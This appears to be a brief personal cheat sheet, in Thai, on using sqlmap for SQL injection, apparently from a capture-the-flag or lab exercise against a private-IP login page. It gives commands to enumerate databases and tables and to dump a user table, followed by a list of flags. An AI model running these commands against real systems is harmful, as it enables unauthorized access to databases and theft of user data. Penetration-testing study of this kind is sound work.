#web
# What
- tool ไว้ทำ sql injection
- หา url ที่มี get/pose
# Command
ดู database ทั้งหมด
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" --dbs
```
ดู tables ทั้งหมดใน database ai
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" -D ai --tables
```
ดู data ทั้งหมดใน table user จาก database ai
```bash
sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" -D ai -T user --dump
```
# Syntax
- -u url
- --dbs เทส playload หา database
- --tables เทส playload หา table
- -D Database
- -T table
- -dump ดึงออกมา
- -r อ่านไฟล์ request
- -p กำหนดว่าจะเทส playload ตรงไหน